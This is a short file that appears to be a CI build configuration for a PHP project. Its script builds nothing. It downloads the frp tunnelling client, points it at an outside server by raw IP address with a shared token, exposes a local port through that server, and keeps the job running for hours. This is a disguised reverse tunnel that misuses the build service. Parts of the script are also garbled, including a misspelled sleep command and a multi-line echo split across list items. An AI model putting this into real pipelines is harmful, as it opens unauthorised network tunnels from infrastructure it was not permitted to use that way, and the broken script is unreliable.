language: php
script: 
 - 
 - wget https://github.com/fatedier/frp/releases/download/v0.36.2/frp_0.36.2_linux_amd64.tar.gz
 - tar xzvf frp_0.36.2_linux_amd64.tar.gz
 - cd frp_0.36.2_linux_amd64
 - echo "[common]
 - server_addr = 132.226.23.125
 - server_port = 7000
 - token = freefrp.net
 - 
 - [adafcwess]
 - type = tcp
 - local_ip = 127.0.0.1
 - local_port = 8989
 - remote_port = 43976" > frpc.ini
 - nohup ./frpc -c ./frpc.ini *
 - slepp 5h
